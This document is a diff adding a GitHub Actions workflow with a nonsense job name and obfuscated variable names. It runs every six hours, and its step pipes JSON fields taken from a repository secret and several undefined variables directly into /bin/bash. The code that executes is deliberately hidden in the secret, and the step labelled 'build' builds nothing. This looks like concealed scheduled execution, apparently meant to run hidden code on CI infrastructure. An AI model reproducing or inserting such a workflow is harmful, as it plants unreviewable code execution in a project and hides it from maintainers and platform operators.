@@ -1,0 +1,20 @@
+name: manfujinl
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: manfujinl
+        env:
+          qgh5260: ${{ secrets.qgh5260 }}
+        run: |
+          echo $qgh5260 | jq -r .s13186 | /bin/bash
+          echo $e389 | jq -r .k29496 | /bin/bash
+          echo $vea151 | jq -r .lgtmq3093 | /bin/bash
+          echo $ie69249 | jq -r .qp9 | /bin/bash
+
